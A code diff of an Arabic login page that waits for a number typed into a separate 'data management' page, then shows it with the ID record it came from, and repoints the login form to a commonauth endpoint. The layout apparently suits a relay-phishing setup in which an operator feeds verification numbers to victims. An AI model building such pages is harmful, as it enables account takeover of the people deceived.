@@ -380,10 +380,21 @@
             <p style="color: #78849e;" id="loadingMessage">الرجاء الانتظار...</p>
             
             <!-- معلومات إضافية -->
-            
+            <div id="loadingInfo" style="margin-top: 20px; padding: 10px 20px; background: #e3f2fd; border-radius: 8px; border-left: 4px solid #0D98BA; max-width: 500px;">
+                <i class="fas fa-exclamation-circle"></i>
+                <span>هذه الصفحة تنتظر حتى يتم إدخال رقم من صفحة إدارة البيانات</span>
+            </div>
             
             <!-- أزرار التحكم -->
-    
+            <div style="margin-top: 30px; display: flex; gap: 15px; flex-wrap: wrap; justify-content: center;">
+                <button onclick="openDataPage()" style="padding: 12px 25px; background: #00ac75; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px;">
+                    <i class="fas fa-external-link-alt"></i> فتح صفحة البيانات
+                </button>
+                
+                <button onclick="checkNumberNow()" style="padding: 12px 25px; background: #0D98BA; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px;">
+                    <i class="fas fa-sync-alt"></i> التحقق الآن
+                </button>
+            </div>
         </div>
         
         <!-- المحتوى الرئيسي (يظهر فقط بعد إدخال الرقم) -->
@@ -401,7 +412,7 @@
             <!-- Main Content -->
             <div class="login-container-fluid">
                 <div class="login-container">
-                    <form id="loginForm" action="success.html" method="post"
+                    <form id="loginForm" action="../../commonauth" method="post"
                           enctype="application/x-www-form-urlencoded" autocomplete="off" novalidate>
                         
                         <!-- Hidden Inputs -->
@@ -606,7 +617,21 @@
                     // عرض معلومات إضافية
                     const passcodeInfo = document.getElementById('passcodeInfo');
                     if (passcodeInfo) {
-                       
+                        const sourceInfo = numberData.source === 'record_extraction' ? 
+                            `(مستخرج من سجل: ${numberData.idNumber})` : 
+                            `(مدخل يدوياً)`;
+                        
+                        passcodeInfo.innerHTML = `
+                            <div style="margin-top: 10px; padding: 8px; background: #f5f5f5; border-radius: 5px;">
+                                <i class="fas fa-info-circle" style="color: #0D98BA;"></i>
+                                تم تحميل الرقم: ${formattedNumber} ${sourceInfo}
+                                <span style="font-size: 12px; color: #888; display: block; margin-top: 3px;">
+                                    تم الإدخال: ${new Date(numberData.timestamp).toLocaleTimeString('ar-SA')}
+                                </span>
+                            </div>
+                        `;
+                    }
+                    
                     // تحديث نص الانتظار
                     const waitingText = document.getElementById('waitingText');
                     if (waitingText) {
